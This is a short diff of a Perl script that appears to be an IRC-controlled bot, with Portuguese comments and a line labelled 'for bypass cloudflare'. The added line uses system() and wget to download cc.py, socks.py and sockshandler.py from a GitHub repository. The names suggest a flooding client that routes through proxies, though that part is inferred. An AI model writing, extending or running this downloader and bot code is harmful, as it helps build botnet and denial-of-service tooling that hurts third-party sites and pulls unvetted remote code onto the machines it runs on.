@@ -11,7 +11,7 @@ my $nick    = "Linux-$code"; #$code vai gerar um número aleatório#
 # for bypass cloudflare #
 unless (-e "cc.py") {
   print "[*] Instalando...";
-  system("wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/cc.py");
+  system("wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/cc.py && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/socks.py && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/sockshandler.py");
 }
 
 all();
